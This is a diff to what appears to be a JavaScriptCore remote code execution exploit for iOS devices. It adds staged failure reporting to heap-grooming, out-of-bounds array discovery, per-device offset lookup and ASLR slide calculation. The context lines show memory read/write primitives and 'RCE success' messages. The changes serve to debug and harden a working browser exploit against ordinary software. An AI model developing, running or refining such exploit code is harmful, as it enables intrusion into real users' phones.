@@ -5852,6 +5852,13 @@ class check_attempt {
         this.read32;
         this.read64;
         this.write64;
+        this.lastFailure = "";
+    }
+
+    failStage(stage, reason) {
+        this.lastFailure = `${stage}: ${reason}`;
+        print(this.lastFailure);
+        return false;
     }
 
     stage1() {
@@ -6305,20 +6312,17 @@ const device_chipset = {
         print(`libsystem_pthread_linkedit: ${libsystem_pthread_linkedit.hex()}`);
         const linkedit_map = linkedit_to_device[ios_version];
         if (!linkedit_map) {
-            print(`missing linkedit map for ios_version=${ios_version}`);
-            return false;
+            return this.failStage("stage1", `missing linkedit map for ios_version=${ios_version}`);
         }
         device_model = linkedit_map[libsystem_pthread_linkedit];
         if (!device_model) {
-            print(`missing device model for ios_version=${ios_version} libsystem_pthread_linkedit=${libsystem_pthread_linkedit.hex()} known=${Object.keys(linkedit_map).join(",")}`);
-            return false;
+            return this.failStage("stage1", `missing device model for ios_version=${ios_version} libsystem_pthread_linkedit=${libsystem_pthread_linkedit.hex()} known=${Object.keys(linkedit_map).join(",")}`);
         }
         print("device_model: " + device_model);
         chipset = device_chipset[device_model];
         const device_offsets = rce_offsets[device_model];
         if (!device_offsets) {
-            print(`missing rce offsets for device_model=${device_model}`);
-            return false;
+            return this.failStage("stage1", `missing rce offsets for device_model=${device_model}`);
         }
         offsets = { ...device_offsets };
         slide = globalFuncParseFloat - offsets.JavaScriptCore__globalFuncParseFloat;
@@ -6360,8 +6364,7 @@ const device_chipset = {
             }
 
             if (!worker) {
-                print(`stage2 could not find DedicatedWorkerGlobalScope, contexts_length=${contexts_length}`);
-                return false;
+                return this.failStage("stage2", `could not find DedicatedWorkerGlobalScope, contexts_length=${contexts_length} maximum_id=${maximum_id}`);
             }
 
             print(`worker: ${worker.hex()}`);
@@ -6381,13 +6384,13 @@ const device_chipset = {
         }
         catch(e)
         {
-            print("got error in stage2: " + e);
-            return false;
+            return this.failStage("stage2", "exception: " + (e && e.stack ? e.stack : e));
         }
     }
 
 
     start() {
+        this.lastFailure = "";
         const victim_array_allocation_size = (0x120>>3);
         const victim_array_allocations_in_page = 50;
         var victim_cursor = 0;
@@ -6533,16 +6536,23 @@ const device_chipset = {
             var overlap_array_idx = undefined;
             var overlap_idx_in_oob_array = undefined;
             var oob_array = undefined;
+            var max_victim_length = 0;
+            var max_victim_idx = -1;
 
 
             const check_victim = () => {
                 for (let j = 0; j < victim_cursor; j++){
+                    if (victim_list[j].length > max_victim_length) {
+                        max_victim_length = victim_list[j].length;
+                        max_victim_idx = j;
+                    }
                     if (victim_list[j].length > (victim_array_allocation_size*10)){
                         oob_array_idx = j;
                         break;
                     }
                 }
                 if(oob_array_idx === undefined){
+                    this.failStage("stage0", `no oversized victim array after splice; victim_cursor=${victim_cursor} threshold>${victim_array_allocation_size*10} max_length=${max_victim_length} max_idx=${max_victim_idx} counter=${counter}`);
                     return false;
                 }
                 oob_array = victim_list[oob_array_idx];
@@ -6554,6 +6564,7 @@ const device_chipset = {
                     }
                 }
                 if(overlap_array_idx === undefined){
+                    this.failStage("stage0", `oversized victim found but egg scan failed; oob_array_idx=${oob_array_idx} oob_length=${oob_array.length} scan_limit=${victim_array_allocation_size*10} egg1=0x${egg1.toString(16)} egg2=0x${egg2.toString(16)} counter=${counter}`);
                     return false;
                 }
                 this.oob_array = oob_array;
@@ -6565,11 +6576,11 @@ const device_chipset = {
             let got_victim = check_victim();
             if(!got_victim)
             {
-                print("Failed RCE");
+                print("Failed RCE before stage1 primitives: " + (this.lastFailure || "unknown victim discovery failure"));
                 return false;
             }
             const stage1_ok = this.stage1();
-            print(stage1_ok ? "RCE success" : "RCE stage1/stage2 failed");
+            print(stage1_ok ? "RCE success" : "RCE stage1/stage2 failed: " + (this.lastFailure || "unknown failure"));
             return stage1_ok;
         });
     }  
